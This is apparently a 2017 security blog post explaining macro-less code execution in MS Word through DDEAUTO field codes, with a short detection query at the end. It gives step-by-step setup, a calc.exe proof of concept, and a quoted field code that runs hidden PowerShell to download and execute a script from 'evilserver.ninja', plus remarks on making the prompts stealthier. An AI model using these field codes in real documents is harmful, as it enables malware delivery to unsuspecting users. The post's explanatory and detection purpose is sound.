---
layout: post
title: "Code Execution in MSWord"
date: 2017-10-11
---
I read about a cool way to get code execution in MSWord from [SensePost](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ )'s Saif El-Sherei and later read about a way to detect it from [SecurityForRealPeople](https://www.securityforrealpeople.com/2017/10/exploiting-office-native-functionality.html#more)'s David Longenecker. 
Saif does a good job of explaining the steps in his post, but the basic setup is: 
1. <code> Insert </code> tab -> Quick Parts -> <code> Field </code>
2. choose <code> =(Formula) </code> and click ok
3. right-click on <code> !Unexpected End of Formula <code> and choose <code> Toggle Field Codes </code>
4. change the Field Code to contain:
  1.{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
5. save the document and then open it
6. you will get two prompts to click through and then calc will open

The possibilities here are endless. Saif's proof of concept video in the post uses powershell to download an empire launcher
<code> { DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://evilserver.ninja/pp.ps1');powershell -e $e "}
</code>
I think depending on the access I had on the machine, I would change the syntax to be more stealthy, so the popup doesnt raise any red-flags with the user. 

Execution is lots of fun, but improving defenders and showing them how to find the cool techniques is really where the money is made. 

I drilled down on this particular code execution with the Powershell command below. It will differ with environment and context:
1. <code> Get-EventLog -Log "OAlerts" -Newest 5 | where {$_.eventID -eq 300} | format-list -Property Message</code>
